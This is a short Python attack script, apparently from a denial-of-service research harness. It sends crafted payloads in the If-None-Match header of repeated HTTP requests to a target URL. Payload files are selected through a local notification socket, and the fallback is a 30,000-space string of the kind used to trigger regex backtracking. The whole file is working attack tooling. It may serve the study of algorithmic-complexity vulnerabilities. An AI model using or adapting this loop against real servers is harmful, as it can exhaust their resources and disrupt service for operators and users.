import os
import sys
import time
import socket
import threading

# os.system('python -m pip install requests')
import requests

PORT_ATTACKER = 9100

class Attacker:
    def __init__(self):
        self.count = 0

    def request_http(self, url, filename):
        self.count += 1

        print ('Attack content path: %s' % filename)

        try:
            with open(filename) as f:
                attack_content = f.readline().strip()
        except:
            attack_content = 'x' + ' ' * 30000 + 'x'

        try:
            r = requests.get(url, headers = {'if-none-match': attack_content, 'X-Server': '10.161.159.37'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)

filename = None
def recv_notification(adversary_path):
    global filename

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('127.0.0.1', PORT_ATTACKER))
    sock.listen(1)
    while True:
        conn, addr = sock.accept()
        data_b = conn.recv(4, socket.MSG_WAITALL)
        data = data_b.decode()
        conn.close()
        attack_message_index = int(data)
        filename = '%s/attack_%d.txt' % (adversary_path, attack_message_index)
        print ('Get update: %s, %f' % (filename, time.time()))

    sock.close()
    return data

def main():
    url = sys.argv[1].strip()
    adversary_path = sys.argv[2]
    interval = 1.0

    t_notification = threading.Thread(target=recv_notification, args=(adversary_path,))
    t_notification.start()

    global filename
    attacker = Attacker()
    while True:
        if filename == None:
            time.sleep(0.001)
            continue
            
        send_time = time.time()
        attacker.request_http(url, filename)
        elapsed = time.time() - send_time
        if elapsed < interval:
            time.sleep(interval - elapsed)
    
    t_notification.join()

if __name__ == "__main__":
    print ('==========Start==========')
    main()
    print ('==========End==========')
